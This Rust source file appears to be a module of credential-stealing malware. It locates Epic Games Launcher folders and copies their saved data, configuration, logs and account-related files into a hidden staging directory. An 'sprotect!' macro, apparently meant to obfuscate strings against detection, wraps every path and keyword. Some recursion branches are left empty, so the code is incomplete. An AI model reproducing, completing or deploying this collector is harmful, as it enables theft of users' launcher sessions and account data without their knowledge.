use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\EpicGames");
    std::fs::create_dir_all(&output_dir)?;

    let epic_paths = detect_epic_paths().await;
    
    for epic_path in epic_paths {
        extract_epic_data(&epic_path, &output_dir).await.ok();
    }

    Ok(())
}

async fn detect_epic_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let programdata = std::env::var(sprotect!("PROGRAMDATA")).unwrap_or_default();
    
    let epic_locations = vec![
        format!("{}\\{}", userprofile, sprotect!("AppData\\Local\\EpicGamesLauncher")),
        format!("{}\\{}", userprofile, sprotect!("AppData\\Roaming\\EpicGamesLauncher")),
        format!("{}\\{}", programdata, sprotect!("Epic\\EpicGamesLauncher")),
        sprotect!("C:\\Program Files\\Epic Games"),
        sprotect!("C:\\Program Files (x86)\\Epic Games"),
    ];

    for path_str in epic_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_epic_data(epic_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    extract_epic_launcher_data(epic_path, output_dir).await?;
    extract_epic_config_files(epic_path, output_dir).await?;
    Ok(())
}

async fn extract_epic_launcher_data(epic_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let launcher_dirs = vec![
        sprotect!("Saved"),
        sprotect!("Data"),
        sprotect!("Config"),
        sprotect!("Logs"),
        sprotect!("UnrealEngineLauncher"),
    ];

    for dir_name in launcher_dirs {
        let dir_path = epic_path.join(&dir_name);
        if dir_path.exists() {
            let dest_dir = format!("{}\\{}", output_dir, dir_name);
            copy_epic_directory(&dir_path, &dest_dir).await?;
        }
    }

    Ok(())
}

async fn extract_epic_config_files(epic_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_files = vec![
        sprotect!("GameUserSettings.ini"),
        sprotect!("Engine.ini"),
        sprotect!("Game.ini"),
        sprotect!("Input.ini"),
        sprotect!("DeviceProfiles.ini"),
        sprotect!("Scalability.ini"),
    ];

    scan_for_epic_configs(epic_path, &config_files, output_dir).await?;
    Ok(())
}

async fn copy_epic_directory(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_epic_important_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_epic_important_dir(&dir_name) {
                    let new_dest = format!("{}\\{}", dest_dir, dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

async fn scan_for_epic_configs(dir: &PathBuf, config_files: &[String], output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                for config_file in config_files {
                    if file_name.contains(config_file) {
                        let dest_path = format!("{}\\{}", output_dir, file_name);
                        fs::copy(&path, dest_path).ok();
                    }
                }
            } else if path.is_dir() {
                
            }
        }
    }
    Ok(())
}

fn is_epic_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".ini"), sprotect!(".json"), sprotect!(".cfg"), sprotect!(".dat"), sprotect!(".log"), sprotect!(".txt")];
    let important_keywords = [sprotect!("config"), sprotect!("setting"), sprotect!("user"), sprotect!("account"), sprotect!("launcher"), sprotect!("game")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) &&
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_epic_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("config"), sprotect!("saved"), sprotect!("data"), sprotect!("logs"), sprotect!("windows")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}